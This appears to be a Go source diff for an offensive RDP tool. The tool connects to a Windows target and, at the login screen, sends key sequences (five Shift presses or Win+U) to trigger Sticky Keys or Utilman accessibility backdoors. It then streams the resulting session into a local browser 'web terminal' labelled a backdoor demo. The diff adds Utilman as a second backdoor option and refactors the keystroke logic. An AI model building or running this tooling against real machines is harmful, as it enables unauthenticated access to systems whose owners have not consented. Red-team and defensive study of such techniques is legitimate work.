@@ -64,12 +64,65 @@ func openBrowser(url string) {
 	_ = cmd.Start()
 }
 
+// keyEvent represents a single keyboard event (press or release).
+type keyEvent struct {
+	scancode uint16
+	pressed  bool
+}
+
+// sendKeySequence sends a sequence of key events with 50ms spacing between each event.
+func sendKeySequence(sess interface {
+	SendKey(uint16, bool) error
+}, events ...keyEvent) error {
+	for i, evt := range events {
+		if err := sess.SendKey(evt.scancode, evt.pressed); err != nil {
+			action := "release"
+			if evt.pressed {
+				action = "press"
+			}
+			return fmt.Errorf("key %s: %w", action, err)
+		}
+		// Add delay between key events (except after the last one)
+		if i < len(events)-1 {
+			time.Sleep(50 * time.Millisecond)
+		}
+	}
+	return nil
+}
+
+// triggerBackdoor sends the backdoor-specific key sequence on the given session.
+func triggerBackdoor(sess interface {
+	SendKey(uint16, bool) error
+}, kind BackdoorType) error {
+	switch kind {
+	case BackdoorUtilman:
+		// Win+U sequence
+		return sendKeySequence(sess,
+			keyEvent{leftWinScancode, true},
+			keyEvent{uKeyScancode, true},
+			keyEvent{uKeyScancode, false},
+			keyEvent{leftWinScancode, false},
+		)
+	default: // BackdoorStickyKeys
+		// 5x Shift sequence
+		var events []keyEvent
+		for i := 0; i < 5; i++ {
+			events = append(events,
+				keyEvent{leftShiftScancode, true},
+				keyEvent{leftShiftScancode, false},
+			)
+		}
+		return sendKeySequence(sess, events...)
+	}
+}
+
 // sessionManager holds the active RDP session and allows reconnection.
 type sessionManager struct {
-	mu      sync.RWMutex
-	sess    *InteractiveSession
-	target  string
-	timeout time.Duration
+	mu           sync.RWMutex
+	sess         *InteractiveSession
+	target       string
+	timeout      time.Duration
+	backdoorType BackdoorType
 }
 
 // Session returns the current active session.
@@ -79,7 +132,7 @@ func (m *sessionManager) Session() *InteractiveSession {
 	return m.sess
 }
 
-// Reconnect closes the old session and creates a new one with sticky keys.
+// Reconnect closes the old session and creates a new one, triggering the configured backdoor.
 func (m *sessionManager) Reconnect(ctx context.Context) error {
 	m.mu.Lock()
 	defer m.mu.Unlock()
@@ -105,18 +158,10 @@ func (m *sessionManager) Reconnect(ctx context.Context) error {
 	time.Sleep(3 * time.Second)
 	newSess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys (5x Shift)
-	for i := 0; i < 5; i++ {
-		if sendErr := newSess.SendKey(leftShiftScancode, true); sendErr != nil {
-			newSess.Close()
-			return fmt.Errorf("shift press: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
-		if sendErr := newSess.SendKey(leftShiftScancode, false); sendErr != nil {
-			newSess.Close()
-			return fmt.Errorf("shift release: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
+	// Trigger the appropriate backdoor
+	if triggerErr := triggerBackdoor(newSess, m.backdoorType); triggerErr != nil {
+		newSess.Close()
+		return fmt.Errorf("trigger backdoor: %w", triggerErr)
 	}
 
 	time.Sleep(1 * time.Second)
@@ -135,10 +180,18 @@ func (m *sessionManager) Close() {
 	}
 }
 
-// RunWebTerminal connects to an RDP target via sticky keys and serves an
+// BackdoorType indicates which backdoor to trigger in web terminal mode.
+type BackdoorType string
+
+const (
+	BackdoorStickyKeys BackdoorType = "stickykeys"
+	BackdoorUtilman    BackdoorType = "utilman"
+)
+
+// RunWebTerminal connects to an RDP target via sticky keys or utilman and serves an
 // interactive web terminal on localhost. Opens a browser-controllable RDP
 // session with live screen streaming, keyboard, and mouse input.
-func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool) error {
+func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, backdoorType BackdoorType) error {
 	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for interactive web terminal...\n", target)
 
 	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
@@ -147,9 +200,10 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}
 
 	mgr := &sessionManager{
-		sess:    sess,
-		target:  target,
-		timeout: timeout,
+		sess:         sess,
+		target:       target,
+		timeout:      timeout,
+		backdoorType: backdoorType,
 	}
 	defer mgr.Close()
 
@@ -158,17 +212,15 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	time.Sleep(3 * time.Second)
 	sess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys
-	fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
-	for i := 0; i < 5; i++ {
-		if sendErr := sess.SendKey(leftShiftScancode, true); sendErr != nil {
-			return fmt.Errorf("shift press: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
-		if sendErr := sess.SendKey(leftShiftScancode, false); sendErr != nil {
-			return fmt.Errorf("shift release: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
+	// Trigger the appropriate backdoor
+	if backdoorType == BackdoorUtilman {
+		fmt.Fprintf(os.Stderr, "[*] Sending Win+U to trigger utilman...\n")
+	} else {
+		fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
+	}
+
+	if triggerErr := triggerBackdoor(sess, backdoorType); triggerErr != nil {
+		return fmt.Errorf("trigger backdoor: %w", triggerErr)
 	}
 
 	time.Sleep(1 * time.Second)
@@ -259,9 +311,17 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}()
 
 	url := fmt.Sprintf("http://127.0.0.1:%d", port)
+
+	// Set banner label based on active backdoor type
+	backdoorLabel := "Sticky Keys"
+	if backdoorType == BackdoorUtilman {
+		backdoorLabel = "Utilman"
+	}
+	bannerTitle := fmt.Sprintf("RDP Web Terminal - %s Backdoor Demo", backdoorLabel)
+
 	fmt.Fprintf(os.Stderr, "\n")
 	fmt.Fprintf(os.Stderr, "  ╔══════════════════════════════════════════════════╗\n")
-	fmt.Fprintf(os.Stderr, "  ║  RDP Web Terminal - Sticky Keys Backdoor Demo   ║\n")
+	fmt.Fprintf(os.Stderr, "  ║  %-48s ║\n", bannerTitle)
 	fmt.Fprintf(os.Stderr, "  ╠══════════════════════════════════════════════════╣\n")
 	fmt.Fprintf(os.Stderr, "  ║  Target: %-39s ║\n", target)
 	fmt.Fprintf(os.Stderr, "  ║  URL:    %-39s ║\n", url)
